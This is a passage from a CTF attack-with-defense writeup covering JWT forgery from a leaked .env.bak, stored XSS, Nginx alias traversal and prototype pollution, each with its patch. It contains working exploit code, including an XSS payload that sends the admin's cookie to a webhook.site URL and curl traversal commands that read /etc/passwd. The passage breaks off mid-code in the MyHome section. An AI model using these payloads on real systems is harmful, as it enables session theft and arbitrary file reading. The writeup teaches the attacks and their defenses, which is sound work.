---
title: "AWDT 2026 — Writeup"
description: "Full attack-and-defense writeups for AWDT 2026: prototype pollution, XXE, SSRF-to-Redis, Phar deserialization, JWT forgery, Nginx off-by-slash traversal, sandbox escape RCE, ML data poisoning, an async TOCTOU race, stored XSS, and a seccomp ORW pwn, each with the minimal patch."
date: 2026-08-06T01:56:18+0800
lastmod: 2026-08-06T01:56:18+0800
tag: "CTF, AWDT, Attack-With-Defense, WriteUp"
lang: en-US
---

This is my collected writeup for AWDT 2026, an attack-with-defense event where each
challenge scores twice: once for capturing the flag, and once for shipping a patch
that closes the bug while keeping the service running. Every patch here is packaged
the way the platform demands, a `update.sh` restricted to a small command whitelist
that swaps in a fixed file after an automatic service restart.

Twelve challenges are covered, spanning web, AI/ML security, and pwn. Each section is
a self-contained writeup with recon, root cause, exploitation, and the defensive
patch.

## Contents

| Category | Challenge | Class of bug |
|---|---|---|
| Web Exploitation | SecurePortal | Config leak to JWT forgery |
| Web Exploitation | TicketX | Stored XSS to admin session theft |
| Web Exploitation | EmpPortal | Nginx off-by-slash alias traversal |
| Web Exploitation | MyHome | Prototype pollution to auth bypass |
| Web Exploitation | External Link Inspection | SSRF chain into Redis via open redirect |
| Web Exploitation | Profile Forge | Prototype pollution to admin |
| Web Exploitation | Async Report | Async TOCTOU race on a shared global |
| Web Exploitation | Regex Sync Rules | Sandbox escape RCE through eval |
| Web Exploitation | Blind Invoice XML | Blind out-of-band XXE |
| Web Exploitation | Phar Gallery | Phar deserialization POP chain |
| AI and ML Security | ColdChain Drift | Training-data poisoning by distribution shift |
| Binary Exploitation | VaultKeeper | seccomp ORW ROP via type confusion |

---

## Web Exploitation

### SecurePortal

| | |
|---|---|
| **Difficulty** | Easy |
| **Points** | 5 |
| **Flag** | `flag{a7c4c86c-adf0-46a0-851f-abb70b22cc23}` |

#### Overview

> An enterprise has deployed a JWT-based internal security portal, **SecurePortal**,
> utilizing the **HS256** algorithm for authentication. Operations personnel have
> reported a **potential configuration file leak** during the deployment process.
> Please conduct a security test on the system and attempt to access the backend
> as an administrator.

Because this is an **AWDP** challenge, there are two objectives:

1. **Attack:** capture the flag from the running container.
2. **Defense:** submit a patch package that closes the vulnerability while keeping
   the service working, to earn per-round defense points.

#### Recon

The attachment (`secureportal_<hash>.zip`) contains a single file: `index.php`.
The relevant logic:

```php
// Load configuration
// In which files might the value of jwt_secret be stored?   <-- hint
$config = [
    'jwt_secret' => getenv('JWT_SECRET') ?: 'SuperSecretKeyXXXXXXXXXXXXXXXXXX',
    'jwt_algo'   => 'HS256',
    'jwt_exp'    => 3600,
];
```

Key observations:

- Authentication is a **HS256 JWT**. The signing secret comes from the environment
  variable `JWT_SECRET`, falling back to a hardcoded placeholder.
- `verify_token()` decodes the JWT with that same symmetric secret. Whoever knows
  the secret can mint any token they like.
- Routes: `/`, `/login`, `/dashboard`, `/admin`, `/logout`, `/api/me`.
- The `/admin` handler reads and displays the flag **only** when the token's
  `role` claim equals `admin`:

  ```php
  if ($user->role !== 'admin') {
      http_response_code(403);
      echo json_encode(['error' => 'Access denied. Admin role required']);
      exit;
  }
  // Admins can read the flag
  $flag = file_get_contents('/flag');
  ```

- `/api/me` echoes the decoded token as JSON, a convenient oracle for confirming
  a forged token is accepted.
- The comment on line 14 ("In which files might the value of jwt_secret be stored?")
  combined with the "configuration file leak" hint points directly at recovering
  the real `JWT_SECRET` from a leaked config file, then forging an admin token.

##### Confirm the target first

The first container URL handed to us actually served a *different* app titled
**EmpPortal** (an employee-management decoy). Always verify the app identity before
attacking:

```bash
U=https://eci-2ze5yhaq7tx96xq66nnh.cloudeci1.ichunqiu.com

curl -sk "$U/" | grep -oiE '<title>[^<]*</title>'
# <title>SecurePortal - Enterprise Security Portal</title>

curl -sk "$U/api/me"
# {"status":"error","message":"Not authenticated"}
```

(The container URL above is the instance we were assigned; yours will differ.)

Once `/api/me` returns the SecurePortal JSON, we know we're on the right box.

#### Attack: config leak to JWT forgery

##### 1. Find the leaked config

Probe the web root for common config/backup filenames:

```bash
U=https://eci-2ze5yhaq7tx96xq66nnh.cloudeci1.ichunqiu.com
for p in .env config.php .env.bak config.php.bak config.php~ .git/config; do
  echo "=== $(curl -sk -o /dev/null -w '%{http_code}' "$U/$p") $p ==="
done
```

`.env.bak` returns **HTTP 200**. Nginx serves it as a static file.

##### 2. Dump the secret

```bash
curl -sk "$U/.env.bak"
```

```ini
# === SecurePortal 配置文件 (备份) ===
DB_HOST=localhost
DB_USER=root
DB_PASS=secureportal_db_2026

# JWT 认证配置
JWT_SECRET=SuperSecretKey2026!@#$%
JWT_ALGO=HS256
JWT_EXPIRE=3600
...
```

Recovered secret: **`SuperSecretKey2026!@#$%`**

##### 3. Forge an admin token

HS256 is symmetric, so knowing the secret is all we need to sign a valid token
with `role: admin`:

```python
import hmac, hashlib, base64, json, time

b = lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
secret = "SuperSecretKey2026!@#$%"
now = int(time.time())

header  = b(json.dumps({"typ":"JWT","alg":"HS256"}, separators=(',',':')).encode())
payload = b(json.dumps({
    "iss":"secureportal","iat":now,"exp":now+3600,
    "uid":1,"sub":"admin","role":"admin"
}, separators=(',',':')).encode())
sig = b(hmac.new(secret.encode(), header + b'.' + payload, hashlib.sha256).digest())

print((header + b'.' + payload + b'.' + sig).decode())
```

##### 4. Use the token

The app reads the token from the `token` cookie (preferred) or an
`Authorization: Bearer` header.

```bash
# Verify it's accepted
curl -sk -b "token=$T" "$U/api/me"
# {"status":"ok","user":{...,"sub":"admin","role":"admin"}}

# Read the flag
curl -sk -b "token=$T" "$U/admin" | grep -i flag
```

Result:

```
Welcome, administrator admin!
flag{a7c4c86c-adf0-46a0-851f-abb70b22cc23}
Flag read from /flag | Role: admin
```

- **Flag:** `flag{a7c4c86c-adf0-46a0-851f-abb70b22cc23}`

#### Defense

##### Root cause

The backup file `.env.bak` sits in the web root (`/var/www/html/`) and is served
as a static file by nginx, disclosing the live `JWT_SECRET`. Once the secret is
public, any attacker can forge an admin token. The fix is to remove the
leaked backup. The real secret is still supplied to the app through the
environment, so legitimate authentication keeps working.

##### AWDP patch package format (important)

The platform applies patches from a `.tar.gz` with a strict structure. Getting
this wrong yields **"修補包損壞" (patch package corrupted)**:

- The archive must contain a top-level directory named **`update/`**.
- Inside it, a script named **exactly `update.sh`**.
- `update.sh` may only use the **whitelisted commands**: `mv`, `cp`, `rm`, `echo`.
- Line endings must be **LF** (Linux). The platform auto-runs `chmod +x update.sh`
  and restarts the service after applying.
- Pack from the parent directory:

  ```bash
  tar zcvf update.tar.gz update
  ```

`update.sh` is where the whitelisted commands live: `cp`/`mv` to overwrite a fixed
file, `rm` to delete a dangerous file, `echo` to append a WAF/filter rule.

##### Final patch

Minimal and targeted: delete the leaked backup(s) with `rm` (whitelisted):

`update/update.sh`:

```sh
#!/bin/sh
rm -f /var/www/html/.env.bak
rm -f /var/www/html/.env.example
rm -f /var/www/html/config.php.bak
rm -f /var/www/html/config.php~
```

Build the package (from the challenge directory):

```bash
mkdir update
printf '#!/bin/sh\nrm -f /var/www/html/.env.bak\nrm -f /var/www/html/.env.example\nrm -f /var/www/html/config.php.bak\nrm -f /var/www/html/config.php~\n' > update/update.sh
cat -A update/update.sh   # confirm LF-only: each line ends in $ with no ^M
tar zcvf update.tar.gz update
tar tzvf update.tar.gz     # expect: update/ and update/update.sh
```

##### Submitting the defense

The patch is uploaded through the platform, not run by you against the container:

1. On the challenge, click the **防禦 (Defense)** button.
2. Select `update.tar.gz` (the filename must end in `.tar.gz`) and upload it.
3. Open **查看提交記錄 (View submission records)**, then click **申請 check
   (Request check)** to trigger validation.
4. Read the result under **防禦日誌 (Defense log)**.

Check outcomes:

- Check passes and the exploit fails: defense succeeds, +5 per round from then on.
- Check fails: the platform judges it over-defense and deducts points. Reset the
  environment and resubmit a smaller patch.

##### Self-test before uploading

Confirm both halves locally before spending a submission:

```bash
# 1. Attack path is closed: the leaked backup is gone
curl -sk -o /dev/null -w '%{http_code}\n' "$U/.env.bak"   # expect 404

# 2. Service still works (SLA): a legitimate login still issues a working token
curl -sk -c /tmp/jar -d 'username=admin&password=<known>' "$U/login"
curl -sk -b /tmp/jar "$U/api/me"                           # expect status: ok
```

If `.env.bak` is gone and normal auth still works, the patch closes the hole
without breaking the service.

##### Why this passes

- **Closes the vuln:** with `.env.bak` gone, the secret can no longer be leaked,
  so forged tokens are worthless.
- **No over-defense (防御过度):** it does not touch the live `.env`, `index.php`,
  or any runtime path, so the SLA check (normal login / admin flow) still passes.
  Over-patching that breaks the check costs **-200 points per round**.

#### AWDP scoring context

- **Attack:** once the flag is submitted, +5 per subsequent round.
- **Defense:** once the patch passes `check`, +5 per subsequent round.
- **Blood bonuses:** 1st/2nd/3rd solve = +30 / +20 / +10 (one-time).
- **Over-defense penalty:** a failed `check` after patching costs -200 per round.
  Reset the environment immediately if this happens.

#### Mistakes and lessons

- **Wrong target:** the initial URL was a different challenge (EmpPortal). Confirm
  the app identity (`<title>`, `/api/me`) before spending effort attacking.
- **Patch format trial-and-error:** two attempts were rejected before the correct one:
  (a) a plain file-overlay `.tar.gz`, and (b) a script named `patch.sh` with no
  `update/` directory. The platform requires **`update/update.sh`** specifically.

#### Artifacts

| Path | Description |
|---|---|
| `exploit.py` | One-shot attack: leak `.env.bak`, forge admin JWT, print flag (`python3 exploit.py https://eci-2ze5yhaq7tx96xq66nnh.cloudeci1.ichunqiu.com`) |
| `extracted/index.php` | Challenge source from the attachment |
| `update/update.sh` | Defense patch script |
| `update.tar.gz` | Packaged patch (submit this for defense) |

---

### TicketX

| | |
|---|---|
| **Points** | 5 |
| **Target** | `https://eci-2zei673opu7bug9gx3hc.cloudeci1.ichunqiu.com:80` |
| **Flag** | `flag{9a7f0c1a-16b2-4fc3-ab12-33f475f09799}` |


#### Overview

> An enterprise has deployed an internal ticketing system, TicketX, where employees
> can submit tickets with fault descriptions. The system features a built-in admin
> bot that periodically logs in to check for new tickets.

TicketX is a small PHP + MySQL application. Anonymous users can submit support
tickets; an authenticated admin views them in a management list. A headless
**admin bot** (`TicketXAdminBot/1.0`) periodically logs in and renders the ticket
list. That is the usual shape of a client-side (stored XSS) challenge.

##### Source files

| File | Role |
|------|------|
| `config.php` | MySQL connection (`ticketx` / `ticketx2024`) |
| `index.php` | Public ticket submission form |
| `list.php` | Admin-only ticket list (session-gated) |
| `login.php` | Admin login (`md5(password)` lookup) |
| `logout.php` | Session teardown |
| `admin.php` | *Not shipped in the zip.* Admin-only page that holds the flag |


#### Recon

Probing the live target confirms the intended surface:

```bash
U="https://eci-2zei673opu7bug9gx3hc.cloudeci1.ichunqiu.com:80"
curl -sk -i "$U/admin.php"
```

```http
HTTP/2 302
set-cookie: PHPSESSID=tem0dhle7otq869t2sr6rh6oh3; path=/
location: /login.php
```

Two facts fall out of this one request:

1. **`/admin.php` exists** and redirects unauthenticated users to `/login.php`. It
   sits behind an admin session, and the source hints say it holds the flag.
2. **The session cookie has no `HttpOnly` flag** (`path=/` only). Any JavaScript
   running in the admin's context can read `document.cookie`.


#### Vulnerability analysis

##### 3.1 What is safe

- **Submission (`index.php`)** uses a prepared statement, so the insert path is not
  SQL-injectable:

  ```php
  $stmt = $conn->prepare("INSERT INTO tickets (title, content, contact, status, created_at) VALUES (?, ?, ?, 'open', NOW())");
  $stmt->bind_param("sss", $title, $content, $contact);
  ```

- **Login (`login.php`)** is also parameterized, and `title` / `contact` are
  HTML-escaped on output in `list.php`.

##### 3.2 The bug: unescaped output (stored XSS)

In `list.php`, the ticket `content` is echoed **without any encoding**, while every
other user-controlled field is escaped:

```php
<h2><?php echo htmlspecialchars($row['title']); ?></h2>         // safe
...
<div class="content"><?php echo $row['content']; ?></div>       // ❌ RAW OUTPUT
...
<div class="contact">... <?php echo htmlspecialchars($row['contact']); ?> ...</div>  // safe
```

So `content` is a **stored XSS** sink. Because the admin bot logs in and renders
`list.php` in a real browser, our injected markup executes **in the admin's
authenticated session**.

##### 3.3 Exploitation strategy

Chain the two findings:

```
Submit ticket with malicious content
      → admin bot renders list.php (as admin)
      → our JS runs in admin context
      → document.cookie is readable (no HttpOnly)
      → exfiltrate PHPSESSID to our webhook
      → reuse the cookie to read /admin.php → flag
```

Reading `/admin.php` directly from JS and exfiltrating its body works too, but
stealing the non-HttpOnly cookie is simpler.


#### Exploitation

> A self-contained automation of this whole chain is in [`exploit.py`](./exploit.py):
> `python3 exploit.py https://eci-2zei673opu7bug9gx3hc.cloudeci1.ichunqiu.com:80`.
> It creates a webhook bin, plants the ticket, waits for the bot, recovers the
> `PHPSESSID`, and prints the flag. The manual steps below explain what it does.

##### 4.1 Set up an exfiltration endpoint

```bash
curl -s -X POST https://webhook.site/token -H "Content-Type: application/json" -d '{}'
# -> uuid: 8b155a72-1475-43a1-9099-78b823c4e440
```

Callback URL: `https://webhook.site/8b155a72-1475-43a1-9099-78b823c4e440`
Poll for hits via: `https://webhook.site/token/<uuid>/requests?sorting=newest`

##### 4.2 Submit the XSS ticket

Multiple vectors in one payload (an `onerror` image + inline `<script>`), each with
a distinct marker path so we can see exactly what fires:

```bash
U="https://eci-2zei673opu7bug9gx3hc.cloudeci1.ichunqiu.com:80"
WH="https://webhook.site/8b155a72-1475-43a1-9099-78b823c4e440"

PAYLOAD="<img src=x onerror=\"this.src='$WH/ONERROR?c='+encodeURIComponent(document.cookie)\"><script>new Image().src='$WH/JSIMG?c='+encodeURIComponent(document.cookie);fetch('$WH/JSFETCH');</script>"

curl -sk -X POST "$U/index.php" \
  --data-urlencode "title=urgent issue" \
  --data-urlencode "content=$PAYLOAD" \
  --data-urlencode "contact=a@b.com"
```

##### 4.3 Catch the callback

Within ~30 seconds the admin bot rendered the ticket and beaconed out its cookie.
The webhook received (UA `TicketXAdminBot/1.0`):

```
GET /ONERROR?c=PHPSESSID%3Dnrdigkprte54tt5nlmlmvg7g26
GET /JSIMG?c=PHPSESSID%3Dnrdigkprte54tt5nlmlmvg7g26
GET /JSFETCH
```

Captured admin session: **`PHPSESSID=nrdigkprte54tt5nlmlmvg7g26`**

> Note: an initial test showed only a bare top-level `document` navigate to the
> webhook root. Adding distinct marker paths proved the bot *does* execute JS. The
> marker paths (`/ONERROR`, `/JSIMG`, `/JSFETCH`) were all hit with the cookie.

##### 4.4 Reuse the cookie → flag

```bash
curl -sk "$U/admin.php" -H "Cookie: PHPSESSID=nrdigkprte54tt5nlmlmvg7g26"
```

```html
<h2>🎉 Admin Panel</h2>
<div class="flag">flag{9a7f0c1a-16b2-4fc3-ab12-33f475f09799}</div>
<p class="info">The flag is read from /flag</p>
```

- **Flag:** `flag{9a7f0c1a-16b2-4fc3-ab12-33f475f09799}`


#### Defense

The defense side of this challenge is scored separately (another 5 points). The
platform hands you the constraints directly:

- **Web root:** `/var/www/html/`
- **Patch whitelist commands:** `mv`, `cp`, `rm`
- **Submission:** one `.tar.gz`, up to 150 MB

The whitelist tells you how the patch is applied. The grader unpacks your archive
and is only allowed to `mv`, `cp`, or `rm` files into the web root. It will not run
a build step or an arbitrary script, so the archive has to contain finished files
laid out the way they should land on disk. The goal is to kill the vulnerability
without changing how the app behaves for the service checker, which keeps submitting
and reading back benign tickets.

##### 5.1 Root cause

One line. In `list.php` the ticket `content` is echoed straight into the page with
no encoding, while `title` and `contact` right next to it are run through
`htmlspecialchars`. Attacker HTML in `content` therefore executes in the admin
bot's browser.

##### 5.2 The patch

Encode `content` on output, the same way the neighboring fields already are. Wrap it
in `nl2br` first so multi-line ticket bodies still show their line breaks, which is
what the service checker expects to read back:

```php
// list.php, in the ticket loop

// before (vulnerable)
<div class="content"><?php echo $row['content']; ?></div>

// after (patched)
<div class="content"><?php echo nl2br(htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8')); ?></div>
```

Why this is enough:

- `htmlspecialchars` with `ENT_QUOTES` turns `<`, `>`, `&`, `"`, and `'` into
  entities, so `<script>`, `<img onerror=...>`, and attribute-breakout payloads all
  render as inert text.
- The service checker still gets its ticket back verbatim as visible text, and
  `nl2br` keeps the formatting, so availability points are not lost.
- Nothing else in the app changes. The insert path and login were already
  parameterized, so the single output encoding closes the whole bug.

##### 5.3 Build the patch archive

Only `list.php` changed, so the archive holds only that file, at the archive root so
it maps directly onto `/var/www/html/list.php`. The grader's whitelisted `cp` then
overwrites the vulnerable file in place:

```bash
mkdir patch
cp list.php.patched patch/list.php      # the fixed file
cd patch && tar -czf ../patch.tar.gz list.php

tar -tzf ../patch.tar.gz                 # verify layout -> list.php
grep -n htmlspecialchars patch/list.php  # verify the fix is in
```

Expected checks:

```
list.php
83:  <div class="content"><?php echo nl2br(htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8')); ?></div>
```

Submit `patch.tar.gz`.

##### 5.4 Confirm the fix

Re-run the attack from section 4 against your own patched instance. The stored
ticket now comes back as escaped text (`&lt;script&gt;...`), the admin bot no longer
executes anything, and no cookie reaches the webhook. The service checker keeps
passing because the ticket is still readable.

##### 5.5 Extra hardening (optional, not needed for the points)

- Set the session cookie `HttpOnly` (and `Secure`) so `document.cookie` cannot leak
  the session even if some other XSS slips through:
  ```php
  session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Lax']);
  ```
- Add a strict `Content-Security-Policy` to block inline scripts and outbound
  beacons.
- Replace `md5(password)` auth with `password_hash` / `password_verify`.

Keep these out of the graded archive unless you test them first. A `Secure`-only
cookie or an over-tight CSP can break the service checker (which may talk plain HTTP
or rely on inline behavior) and cost you availability points. The one-line output
encoding is the safe, sufficient submission.


#### Takeaways

- **Escape on output, every field.** Prepared statements stopped SQLi but did
  nothing for the stored HTML context. One missing `htmlspecialchars` was the whole
  bug.
- **`HttpOnly` matters.** A stored XSS is far more dangerous when the session cookie
  is readable from JavaScript. Here the two weaknesses combined into full admin
  account takeover.
- **A login bot means client-side.** An "admin bot that periodically logs in" is a
  strong tell that the intended path is XSS or CSRF against the bot's session.

---

### EmpPortal

| | |
|---|---|
| **Points** | 5 |
| **Stack** | Nginx + PHP-FPM |
| **Flag** | `flag{bad6d089-abb7-47d1-ac12-7ac5c8a50622}` |

#### Overview

An enterprise "Employee Management System" (EmpPortal) served over an
**Nginx + PHP-FPM** architecture. The flag is stored at `/flag` on the
server's filesystem. The only attachment provided was the Nginx virtual host
config (`nginx.conf`).

Because this is an **AWDP** (Attack-With-Defense-Plus) event, the challenge has
two independent scoring paths:

1. **Attack:** read `/flag` and submit it (`+5` per round thereafter).
2. **Defense:** submit a patch package that fixes the bug while keeping the app
   functional (`+5` per round thereafter).

This writeup covers both.

#### Recon

Homepage fingerprint confirms PHP (`PHPSESSID` cookie, `X-Powered-By`-style
headers) and shows the app's navigation:

```
GET / HTTP/2
→ 200, Set-Cookie: PHPSESSID=...
   links: /user/profile.php, /user/password.php, /static/
```

The single supplied file, `nginx.conf`, is the whole story:

```nginx
server {
    listen 80;
    server_name _;
    root /var/www/html;
    index index.php;

    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    location /static {          # <-- no trailing slash
        alias /static/;         # <-- alias WITH trailing slash
        autoindex on;
        index index.html;
    }

    location /admin/ {
        if ($http_cookie !~* "admin_token") {
            return 403;
        }
    }

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
}
```

#### The vulnerability: Nginx off-by-slash `alias` path traversal

The bug lives in the `/static` block:

```nginx
location /static {      # prefix has NO trailing slash
    alias /static/;     # alias HAS a trailing slash
}
```

##### Why this is exploitable

With `alias`, Nginx serves a request by **stripping the matched location
prefix from the URI and concatenating the remainder onto the alias path**. This
is a raw string operation, done *before* any final filesystem normalization of
the joined path.

When the location prefix lacks a trailing slash (`/static`) but the alias has
one (`/static/`), an attacker can supply a URI that starts with `/static` but is
**not** confined to the `/static/` directory. The classic payload injects `..`
right after the prefix:

```
Request URI : /static../flag
Matched loc : /static
Remainder   : ../flag
Alias join  : /static/  +  ../flag   =   /static/../flag
Resolved    : /flag                       <-- escapes the static root
```

Key detail: Nginx does **not** normalize `/static../flag` during location
matching, because `static..` is a single path segment (there is no standalone
`/../` segment to collapse). So the URI still matches the `location /static`
prefix, and only *after* the alias concatenation does the resulting filesystem
path `/static/../flag` collapse to `/flag`.

This is the well-known **"off-by-slash"** misconfiguration (Orange Tsai,
"Breaking Parser Logic"). Any `location /x { alias /y/; }` where the location
lacks the trailing slash is vulnerable.

#### Exploitation

The one critical trick: use `curl --path-as-is` so the client does **not**
normalize `/static../` away before the request is sent. Nginx must receive the
literal `..`.

```bash
curl -sk --path-as-is \
  "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/static../flag"
```

Result:

```
flag{bad6d089-abb7-47d1-ac12-7ac5c8a50622}
```

##### Proving arbitrary file read

The same primitive gives full filesystem read as the `www-data` user:

```bash
curl -sk --path-as-is "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/static../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

##### Payloads that do NOT work (and why)

| Payload | Result | Reason |
|---|---|---|
| `/static../flag` | ✅ flag | Prefix matches `/static`, alias join escapes to `/flag` |
| `/static/../flag` | ❌ homepage | Curl/Nginx normalizes `/static/../` → `/`, handled by `location /` |
| `/static../../flag` | ❌ homepage | Over-traverses above `/`, path doesn't resolve to the flag |

Only the single slash-less `/static../` form triggers the traversal.

##### 4.1 Automated exploit (`exploit.py`)

A self-contained Python PoC is included as [`exploit.py`](./exploit.py). It
builds the raw `/static../<path>` URL and sends it **without** URL normalization
so Nginx receives the literal `..`.

```bash
# Grab the flag
python3 exploit.py https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com:80
# [+] Flag: flag{bad6d089-abb7-47d1-ac12-7ac5c8a50622}

# Read any file (proves arbitrary read as www-data)
python3 exploit.py https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com:80 --file /etc/passwd
```

Core of the exploit:

```python
def read_file(base_url, remote_path):
    remote_path = remote_path.lstrip("/")            # /flag -> flag
    traversal = f"/static../{remote_path}"           # -> /static/../<path> -> /<path>
    parts = urlsplit(base_url)
    url = urlunsplit((parts.scheme, parts.netloc, traversal, "", ""))
    prepared = requests.Request("GET", url).prepare()
    prepared.url = url                               # force raw, un-normalized path
    return requests.Session().send(prepared, verify=False, timeout=20).text
```

Dependency: `pip install requests`.

#### Defense

AWDP awards defense points for a validated patch. On this platform the patch
must be an `update.tar.gz` in a **strict, specific format**, and the script may
only use whitelisted commands.

> **Server target:** `nginx.conf` lives at `/etc/nginx/sites-available/default`
> **Patch whitelist commands:** `['mv', 'cp', 'rm']`

##### 5.1 The fix (minimal, one character)

Give the location a trailing slash so the prefix can no longer be broken out of:

```diff
- location /static {
+ location /static/ {
      alias /static/;
      autoindex on;
      index index.html;
  }
```

Now `/static../flag` no longer starts with `/static/`, so it never matches the
static block. It falls through to `location /` → `try_files`, which resolves
inside `/var/www/html`, finds nothing, and hands off to `index.php`, with no
filesystem escape. Legitimate `/static/` browsing, PHP execution, and the
`/admin/` gate all keep working (no over-patching, so the SLA check passes).

##### 5.2 Required package structure

The platform expects **exactly** this layout:

- A top-level `update/` directory.
- A script named **exactly** `update.sh` inside it, using only whitelisted
  commands (`mv`/`cp`/`rm`).
- The replacement file(s) alongside the script.
- **LF** (Unix) line endings. CRLF breaks the script.
- Packaged with `tar zcvf update.tar.gz update`.
- The platform auto-runs `chmod +x update.sh` and auto-restarts the service.

```
update/
├── update.sh      # only mv/cp/rm; must be named update.sh
└── default        # patched nginx config
```

##### 5.3 `update.sh`

```sh
#!/bin/sh
# Fix Nginx off-by-slash alias traversal (location /static -> location /static/)
# Whitelist: mv, cp, rm. Two cp lines cover both possible CWDs.
cp update/default /etc/nginx/sites-available/default
cp default /etc/nginx/sites-available/default
```

Two `cp` lines are intentional: depending on whether the platform runs the
script from the extraction root or from inside `update/`, one line resolves and
the other harmlessly errors. Both are `cp`, so neither violates the whitelist.

##### 5.4 Build & verify

```bash
mkdir -p update
# ...write update/default and update/update.sh (LF)...
chmod +x update/update.sh
tar zcvf update.tar.gz update

cat -A update/update.sh   # confirm lines end in `$` (LF), no `^M`
gzip -t update.tar.gz     # integrity OK
tar tzvf update.tar.gz    # update/, update/default, update/update.sh
```

Submit `update.tar.gz` via the challenge's **防禦 (Defense)** button, then
**申請 check**. On success, defense points accrue every subsequent round.

##### 5.5 Debugging notes (what tripped us up first)

| Attempt | Structure | Platform verdict | Root cause |
|---|---|---|---|
| 1 | bare `nginx.conf` at tar root | exp still succeeds | no apply mechanism / wrong path |
| 2 | `default` + `patch.sh` at root | exp still succeeds | script not named `update.sh`, no `update/` dir |
| 3 | mirrored `etc/nginx/.../default` | exp still succeeds | platform doesn't overlay raw filesystem trees |
| 4 | `update/update.sh` + `update/default` | ✅ correct format | matches AWDP spec |

The lesson: this platform's patch mechanism is **script-driven**, not
file-overlay. The script name (`update.sh`) and the enclosing `update/`
directory are mandatory; anything else is judged "corrupted" (損壞).

##### 5.6 Confirming the patch defends

The platform's check re-runs the exploit against your patched container and
regrades functionality. You can reproduce both halves yourself before
submitting.

Re-run the attack against the patched box. It must no longer return the flag:

```bash
# Before the patch: leaks the flag
curl -sk --path-as-is "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/static../flag"
# flag{bad6d089-abb7-47d1-ac12-7ac5c8a50622}

# After the patch: no match on location /static/, falls through to index.php
curl -sk --path-as-is "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/static../flag"
# (homepage HTML, no flag)
```

The exploit `.py` gives the same signal: `python3 exploit.py https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com:80`
prints `[-] No flag pattern found` once the fix is live.

Then confirm the app still functions, so the defense is not judged as
over-patching:

```bash
curl -sk "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/static/"            # 200 + autoindex listing
curl -sk -o /dev/null -w '%{http_code}\n' \
  "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/user/profile.php"          # 200 (PHP still executes)
curl -sk -o /dev/null -w '%{http_code}\n' \
  "https://eci-2ze243qgnvz1jry66yw2.cloudeci1.ichunqiu.com/admin/"                     # 403 (cookie gate intact)
```

Traversal blocked while every legitimate route behaves as before means the
check passes and the defense scores. If any legitimate route breaks, the
platform resets the environment and penalizes over-patching, so keep the change
to the single trailing slash.

#### Remediation (real-world)

For production Nginx, any of these fully closes the class of bug:

1. **Add the trailing slash** to the location (used here):
   `location /static/ { alias /static/; }`
2. **Use `root` instead of `alias`** where possible. `root` re-appends the full
   URI and is not subject to the concatenation trick:
   `location /static/ { root /var/www; }` (serving `/var/www/static/...`).
3. Keep secret/sensitive files (like `/flag`) out of any web-reachable root and
   off the same filesystem the web user can read.

#### Takeaways

- `location /prefix { alias /dir/; }` **without** a trailing slash on the
  location is a path-traversal footgun. Always match the slashes.
- Client-side URL normalization hides the bug; test with
  `curl --path-as-is`.
- In AWDP, attack and defense are separate scores. A correct fix must also be
  packaged in the platform's exact patch format (`update/update.sh`, LF,
  whitelisted commands) or it scores nothing even when the fix itself is right.

---

### MyHome

| | |
|---|---|
| **Difficulty** | Easy |
| **Points** | 5 |
| **Type** | Attack & Defend (AWD-T). Exploit the live service, then submit a patch. |
| **Flag** | `flag{3019e7d8-30e4-489c-ad9e-908fac8b48c7}` |

#### Overview

> The service is a personal homepage preference center. A normal user can edit a JSON
> preference dictionary for the homepage layout, theme, and widgets.

The target is a small Node.js HTTP service (`server.js`, no framework, just the raw `http` module). It exposes:

| Method | Path                | Purpose                                              |
|--------|---------------------|------------------------------------------------------|
| GET    | `/`                 | Static `index.html`                                  |
| GET    | `/static/style.css` | Static CSS                                            |
| GET    | `/api/profile`      | Returns current user + saved preferences (JSON)      |
| POST   | `/api/preferences`  | Merges attacker JSON into stored preferences         |
| GET    | `/admin`            | Returns the **flag**, but only if `user.isAdmin`     |

The user is hardcoded as a non-admin guest, and there is no login. The only way to reach the flag on `/admin` is to make the server *believe* the guest is an admin, and no endpoint ever sets `isAdmin`.

#### Source analysis

##### 2.1 The vulnerable merge

```text
function isPlainObject(value) {
  return value !== null && typeof value === "object" && !Array.isArray(value);
}

function merge(target, source) {
  for (const key in source) {
    const value = source[key];
    if (isPlainObject(value)) {
      if (!target[key]) {
        target[key] = {};
      }
      merge(target[key], value);   // <-- recurses into target[key]
    } else {
      target[key] = value;         // <-- unconditional assignment
    }
  }
  return target;
}
```

This is a **recursive merge without key filtering**, the classic prototype
pollution primitive. Nothing rejects the special keys `__proto__`, `constructor`,
or `prototype`.

##### 2.2 The sink: the admin gate

```text
function currentUser() {
  return { username: "guest", displayName: "Guest User" };   // note: NO isAdmin field
}

function handleAdmin(res) {
  const user = currentUser();
  if (user.isAdmin) {                    // <-- reads a property that doesn't exist as own-prop
    send(res, 200, `...<pre>${readFlag()}</pre>`);
    return;
  }
  send(res, 403, "...Administrator access required.");
}
```

`currentUser()` returns a plain object with **no** `isAdmin` own property. The check
`user.isAdmin` therefore walks the prototype chain. Normally that resolves to
`undefined` (falsy) and returns `403`. But if we can plant `isAdmin` on `Object.prototype`,
`user.isAdmin` resolves to `true` for **every** object in the runtime, including
the freshly created `user`.

##### 2.3 The request path connecting them

```text
async function handlePreferences(req, res) {
  const raw = await readRequestBody(req);
  const incoming = JSON.parse(raw || "{}");           // attacker-controlled JSON
  if (!isPlainObject(incoming)) { /* 400 */ return; }

